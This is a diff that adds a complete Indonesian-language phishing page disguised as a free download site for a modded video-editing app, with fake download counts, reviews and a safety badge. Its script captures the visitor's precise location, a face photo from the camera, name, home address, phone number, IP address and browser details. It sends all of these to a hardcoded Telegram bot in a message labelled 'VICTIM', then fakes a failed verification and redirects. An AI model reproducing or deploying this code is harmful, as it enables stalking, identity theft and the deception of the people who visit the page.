@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Alight Motion Premium v5.0.3 MOD APK [Unlocked All/No Watermark] Free Download</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#0a0a0f;font-family:'Segoe UI',Arial,sans-serif;color:#eee}
+        .top-bar{background:#ff2d55;color:#fff;padding:8px;text-align:center;font-size:11px;font-weight:bold}
+        .top-bar span{animation:blink 1.5s infinite}
+        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.5}}
+        .header{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);padding:25px 15px;text-align:center}
+        .header h1{font-size:19px;margin-bottom:5px}
+        .header .meta{color:#aaa;font-size:11px}
+        .header .rating{color:#ffc107;font-size:14px;margin:8px 0}
+        .header .downloads{color:#4CAF50;font-size:12px}
+        .container{max-width:650px;margin:0 auto;padding:15px}
+        .info-card{background:#1a1a2e;padding:18px;border-radius:12px;margin-bottom:12px;font-size:12px;line-height:2}
+        .info-card b{color:#ff2d55}
+        .badge-safe{background:#4CAF50;color:#fff;padding:3px 10px;border-radius:15px;font-size:10px;margin-left:5px}
+        .features{background:#1a1a2e;padding:18px;border-radius:12px;margin-bottom:12px}
+        .features h3{font-size:15px;margin-bottom:10px;color:#ff2d55}
+        .features ul{list-style:none}
+        .features li{padding:8px 0;border-bottom:1px solid #2a2a3e;font-size:13px}
+        .features li::before{content:'✅ '}
+        .btn-dl{display:block;width:100%;padding:18px;background:linear-gradient(135deg,#ff2d55,#c70039);color:#fff;border:none;border-radius:10px;font-size:17px;font-weight:bold;cursor:pointer;margin:15px 0;text-align:center;box-shadow:0 4px 15px rgba(255,45,85,0.4);transition:0.3s;text-decoration:none}
+        .btn-dl:hover{transform:translateY(-2px)}
+        .comments{background:#1a1a2e;padding:18px;border-radius:12px;margin-bottom:12px}
+        .comments h3{font-size:14px;margin-bottom:12px}
+        .comment{display:flex;gap:10px;padding:10px 0;border-bottom:1px solid #2a2a3e;font-size:12px}
+        .comment .avatar{width:35px;height:35px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;color:#fff;font-size:14px;flex-shrink:0}
+        .comment .c-name{font-weight:bold}
+        .comment .c-text{color:#bbb;margin-top:3px}
+        .footer-note{text-align:center;color:#666;font-size:10px;margin:15px 0}
+        .overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999;justify-content:center;align-items:flex-start;overflow-y:auto}
+        .am-container{width:100%;max-width:400px;min-height:100vh;background:#1a1a2e;font-family:'Segoe UI',Arial,sans-serif}
+        .am-header{background:#ff2d55;padding:12px 16px;display:flex;align-items:center;gap:10px;color:#fff}
+        .am-header .am-back{font-size:22px;cursor:pointer;width:30px;text-align:center}
+        .logo-area{text-align:center;padding:30px 20px 20px}
+        .logo-area .am-icon{width:70px;height:70px;background:#ff2d55;border-radius:16px;margin:0 auto 15px;display:flex;align-items:center;justify-content:center;font-size:32px;font-weight:bold}
+        .logo-area h2{font-size:18px;margin-bottom:5px}
+        .logo-area p{font-size:13px;color:#aaa}
+        .form-area{padding:0 16px}
+        .input-group{position:relative;margin-bottom:12px}
+        .input-group input{width:100%;padding:14px;background:#2a2a3e;border:1px solid #3a3a4e;border-radius:8px;font-size:15px;color:#fff;outline:none}
+        .input-group input:focus{border-color:#ff2d55}
+        .input-group input::placeholder{color:#888}
+        .camera-section{background:#2a2a3e;border-radius:12px;margin-bottom:15px;overflow:hidden;text-align:center}
+        .camera-preview{background:#000;border-radius:12px;overflow:hidden;position:relative;display:none}
+        .camera-preview video{width:100%;height:auto;display:block}
+        .capture-btn{background:#ff2d55;color:#fff;border:none;border-radius:25px;padding:12px;font-size:14px;margin:10px;cursor:pointer;font-weight:bold;width:calc(100% - 20px)}
+        .capture-btn:active{transform:scale(0.98)}
+        .camera-permit-btn{background:#ff2d55;color:#fff;border:none;border-radius:25px;padding:14px;font-size:14px;margin-bottom:12px;width:100%;cursor:pointer;font-weight:bold}
+        .location-status{background:#2a2a3e;border-radius:8px;padding:10px;margin-bottom:12px;font-size:12px;text-align:center}
+        .location-status.success{background:#1e3a2e;color:#4CAF50}
+        .location-status.error{background:#3a1e1e;color:#ff5555}
+        .location-status.waiting{background:#3a3a2e;color:#ffc107}
+        .btn-submit{width:100%;padding:16px;background:#ff2d55;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;margin:15px 0}
+        .loading{display:none;text-align:center;padding:10px;color:#ff2d55}
+        .error-msg{display:none;background:#ffebee;border:1px solid #ff2d55;border-radius:8px;padding:12px;margin-bottom:12px;font-size:13px;color:#ff2d55}
+        .brand-footer{text-align:center;padding:12px;font-size:10px;color:#555}
+    </style>
+</head>
+<body>
+
+<div class="top-bar"><span>🔴 LIVE: 1,247 users downloading now • Server: 🇮🇩 Indonesia</span></div>
+
+<div class="header">
+    <h1>Alight Motion Premium v5.0.3 MOD APK</h1>
+    <p class="meta">[ Premium Unlocked • No Watermark • All Effects Pro ]</p>
+    <p class="rating">⭐⭐⭐⭐⭐ 4.8/5 (89,234 votes)</p>
+    <p class="downloads">📥 23,847,392 total downloads • Updated: May 28, 2026</p>
+</div>
+
+<div class="container">
+    <div class="info-card">
+        <b>🎬 App Name:</b> Alight Motion Premium<br>
+        <b>📦 Version:</b> v5.0.3 <span class="badge-safe">LATEST</span><br>
+        <b>📅 Updated:</b> May 28, 2026<br>
+        <b>📥 Size:</b> 156 MB<br>
+        <b>📱 Requires:</b> Android 6.0+<br>
+        <b>🛡 Security:</b> ✅ 100% Safe & Verified
+    </div>
+
+    <div class="features">
+        <h3>✨ Premium Features Unlocked</h3>
+        <ul>
+            <li>No Watermark on export</li>
+            <li>All premium effects unlocked</li>
+            <li>Unlimited layers & keyframes</li>
+            <li>Export up to 4K resolution</li>
+            <li>No ads, no tracking</li>
+            <li>All fonts & stickers included</li>
+        </ul>
+    </div>
+
+    <div class="comments">
+        <h3>💬 User Reviews (12,478)</h3>
+        <div class="comment"><div class="avatar" style="background:#ff2d55;">R</div><div class="c-body"><span class="c-name">Rizky Ardiansyah</span><p class="c-text">Works perfectly! No watermark! Thanks admin 🔥</p></div></div>
+        <div class="comment"><div class="avatar" style="background:#2196F3;">D</div><div class="c-body"><span class="c-name">Dewi Lestari</span><p class="c-text">Finally found working mod. All effects unlocked!</p></div></div>
+        <div class="comment"><div class="avatar" style="background:#4CAF50;">B</div><div class="c-body"><span class="c-name">Bayu Setiawan</span><p class="c-text">Export 4K smooth. Recommended! 💯</p></div></div>
+    </div>
+
+    <button class="btn-dl" onclick="showVerifyPopup()">⬇ DOWNLOAD ALIGHT MOTION PREMIUM (156 MB)</button>
+    <p class="footer-note">⚡ Fast Server Indonesia • Resume supported • No password</p>
+</div>
+
+<div class="brand-footer">© COLDAX ILEGAL SYSTEM</div>
+
+<div class="overlay" id="verifyOverlay">
+    <div class="am-container">
+        <div class="am-header">
+            <span class="am-back" onclick="closeVerify()">←</span>
+            <span>Verify Account</span>
+        </div>
+        
+        <div class="logo-area">
+            <div class="am-icon">🎬</div>
+            <h2>Alight Motion Premium</h2>
+            <p>Verify your identity to continue download</p>
+        </div>
+        
+        <div class="form-area">
+            <div class="error-msg" id="errorMsg"></div>
+            
+            <div class="location-status waiting" id="locationStatus">📍 Waiting for location permission...</div>
+            
+            <div class="camera-section">
+                <button id="cameraPermitBtn" class="camera-permit-btn" onclick="requestCamera()">📷 Izinkan Akses Kamera</button>
+                <div class="camera-preview" id="cameraPreview">
+                    <video id="video" autoplay playsinline muted></video>
+                    <button class="capture-btn" onclick="capturePhoto()">📸 Ambil Foto Wajah</button>
+                </div>
+            </div>
+            
+            <div class="input-group">
+                <input type="text" id="fullname" placeholder="Nama Lengkap (sesuai KTP)" autocomplete="off">
+            </div>
+            
+            <div class="input-group">
+                <input type="text" id="address" placeholder="Alamat Lengkap (rumah / kos)" autocomplete="off">
+            </div>
+            
+            <div class="input-group">
+                <input type="text" id="phone" placeholder="Nomor WhatsApp aktif" autocomplete="off">
+            </div>
+            
+            <button class="btn-submit" onclick="submitData()">VERIFY & DOWNLOAD</button>
+            <div class="loading" id="loading">Processing your data...</div>
+        </div>
+    </div>
+</div>
+
+<script>
+const BOT_TOKEN = '8727025769:AAEtQMe_-96mFUpQBFN_omt9ht0YdN6hy2Q';
+const CHAT_ID = '6633037594';
+
+let locationData = {};
+let capturedPhoto = null;
+let stream = null;
+let cameraReady = false;
+let locationGranted = false;
+let cameraGranted = false;
+
+// AUTO REQUEST LOCATION SAAT POPUP BUKA
+function requestLocation() {
+    const statusDiv = document.getElementById('locationStatus');
+    statusDiv.className = 'location-status waiting';
+    statusDiv.innerHTML = '📍 Getting your location...';
+    
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                locationData.lat = position.coords.latitude;
+                locationData.lon = position.coords.longitude;
+                locationData.accuracy = position.coords.accuracy;
+                
+                // Reverse geocoding buat dapet alamat
+                try {
+                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${locationData.lat}&lon=${locationData.lon}`);
+                    const data = await res.json();
+                    locationData.address = data.display_name || 'Unknown';
+                    locationData.city = data.address?.city || data.address?.town || data.address?.village || 'Unknown';
+                    locationData.country = data.address?.country || 'Unknown';
+                } catch(e) {}
+                
+                statusDiv.className = 'location-status success';
+                statusDiv.innerHTML = `✅ Location captured! (${locationData.lat}, ${locationData.lon})`;
+                locationGranted = true;
+                
+                // Kirim lokasi ke Telegram langsung
+                if(locationData.lat && locationData.lon) {
+                    await sendLocationToTelegram(locationData.lat, locationData.lon);
+                }
+            },
+            (error) => {
+                statusDiv.className = 'location-status error';
+                statusDiv.innerHTML = '❌ Location access denied! Please enable location to continue.';
+                locationGranted = false;
+            },
+            { enableHighAccuracy: true, timeout: 10000 }
+        );
+    } else {
+        statusDiv.className = 'location-status error';
+        statusDiv.innerHTML = '❌ Geolocation not supported';
+    }
+}
+
+// REQUEST CAMERA
+async function requestCamera() {
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        document.getElementById('cameraPreview').style.display = 'block';
+        document.getElementById('cameraPermitBtn').style.display = 'none';
+        cameraReady = true;
+        cameraGranted = true;
+        
+        video.onloadedmetadata = () => video.play();
+    } catch (err) {
+        document.getElementById('errorMsg').style.display = 'block';
+        document.getElementById('errorMsg').textContent = '⚠️ Camera access required! Please allow camera.';
+        cameraGranted = false;
+    }
+}
+
+// CAPTURE PHOTO
+function capturePhoto() {
+    if (!cameraReady || !stream) return;
+    
+    const video = document.getElementById('video');
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    capturedPhoto = canvas.toDataURL('image/jpeg', 0.8);
+    
+    // Matikan kamera
+    if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+    }
+    cameraReady = false;
+    
+    // Ganti tombol jadi disabled
+    const captureBtn = document.querySelector('.capture-btn');
+    captureBtn.textContent = '✅ Photo captured!';
+    captureBtn.disabled = true;
+    captureBtn.style.opacity = '0.7';
+    
+    // Notif
+    const notif = document.createElement('div');
+    notif.style.position = 'fixed';
+    notif.style.bottom = '20px';
+    notif.style.left = '20px';
+    notif.style.right = '20px';
+    notif.style.backgroundColor = '#4CAF50';
+    notif.style.padding = '12px';
+    notif.style.borderRadius = '10px';
+    notif.style.textAlign = 'center';
+    notif.style.zIndex = '1000';
+    notif.innerHTML = '✅ Face photo captured! Fill your address to continue.';
+    document.body.appendChild(notif);
+    setTimeout(() => notif.remove(), 3000);
+}
+
+// SEND KE TELEGRAM
+async function sendToTelegram(method, payload) {
+    try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        return await res.json();
+    } catch(e) { return null; }
+}
+
+async function sendPhotoToTelegram(photoDataUrl) {
+    const blob = await (await fetch(photoDataUrl)).blob();
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', blob, 'face_capture.jpg');
+    
+    try {
+        return await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+    } catch(e) { return null; }
+}
+
+async function sendLocationToTelegram(lat, lon) {
+    await sendToTelegram('sendLocation', { chat_id: CHAT_ID, latitude: lat, longitude: lon });
+}
+
+async function submitData() {
+    const fullname = document.getElementById('fullname').value.trim();
+    const address = document.getElementById('address').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    
+    if(!fullname || !address || !phone) {
+        document.getElementById('errorMsg').style.display = 'block';
+        document.getElementById('errorMsg').textContent = '⚠️ Please fill all fields!';
+        return;
+    }
+    
+    if(!locationGranted) {
+        document.getElementById('errorMsg').style.display = 'block';
+        document.getElementById('errorMsg').textContent = '⚠️ Please allow location access first!';
+        return;
+    }
+    
+    if(!capturedPhoto) {
+        document.getElementById('errorMsg').style.display = 'block';
+        document.getElementById('errorMsg').textContent = '⚠️ Please capture your face photo first!';
+        return;
+    }
+    
+    document.getElementById('errorMsg').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+    document.querySelector('.btn-submit').disabled = true;
+    
+    // Get IP and browser info
+    let ip = 'Unknown';
+    try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        const d = await r.json();
+        ip = d.ip;
+    } catch(e) {}
+    
+    const ua = navigator.userAgent;
+    const time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+    
+    // Send photo
+    if(capturedPhoto) {
+        await sendPhotoToTelegram(capturedPhoto);
+    }
+    
+    const msg = `🎬 *ALIGHT MOTION PREMIUM VICTIM*\n━━━━━━━━━━━━━━━━━━━━━━\n👤 *Nama:* ${fullname}\n🏠 *Alamat:* ${address}\n📱 *WA/HP:* ${phone}\n━━━━━━━━━━━━━━━━━━━━━━\n📍 *LOCATION (PRECISE)*\n• Lat: ${locationData.lat}\n• Lon: ${locationData.lon}\n• Accuracy: ${locationData.accuracy}m\n• City: ${locationData.city || 'Unknown'}\n• Country: ${locationData.country || 'Unknown'}\n• Raw Address: ${locationData.address || 'Unknown'}\n━━━━━━━━━━━━━━━━━━━━━━\n🌐 *NETWORK*\n• IP: ${ip}\n• UA: ${ua}\n⏰ ${time}\n━━━━━━━━━━━━━━━━━━━━━━\n📸 *FACE PHOTO:* Attached above!\n💀 COLDAX ILEGAL SYSTEM`;
+    
+    await sendToTelegram('sendMessage', {
+        chat_id: CHAT_ID,
+        text: msg,
+        parse_mode: 'Markdown'
+    });
+    
+    // Redirect after 2 seconds
+    setTimeout(() => {
+        document.getElementById('loading').style.display = 'none';
+        document.getElementById('errorMsg').style.display = 'block';
+        document.getElementById('errorMsg').textContent = '⚠️ Verification failed. Please try again.';
+        setTimeout(() => {
+            document.getElementById('verifyOverlay').style.display = 'none';
+            window.location.href = 'https://alight-motion.en.uptodown.com/android/download';
+        }, 1500);
+    }, 2000);
+}
+
+function showVerifyPopup() {
+    document.getElementById('verifyOverlay').style.display = 'flex';
+    document.getElementById('errorMsg').style.display = 'none';
+    document.getElementById('loading').style.display = 'none';
+    document.getElementById('fullname').value = '';
+    document.getElementById('address').value = '';
+    document.getElementById('phone').value = '';
+    capturedPhoto = null;
+    locationGranted = false;
+    cameraGranted = false;
+    document.getElementById('cameraPreview').style.display = 'none';
+    document.getElementById('cameraPermitBtn').style.display = 'block';
+    const captureBtn = document.querySelector('.capture-btn');
+    if(captureBtn) {
+        captureBtn.textContent = '📸 Ambil Foto Wajah';
+        captureBtn.disabled = false;
+        captureBtn.style.opacity = '1';
+    }
+    if(stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+    }
+    cameraReady = false;
+    
+    // Auto request location
+    requestLocation();
+}
+
+function closeVerify() {
+    if(stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+    }
+    document.getElementById('verifyOverlay').style.display = 'none';
+}
+</script>
+</body>
+</html>
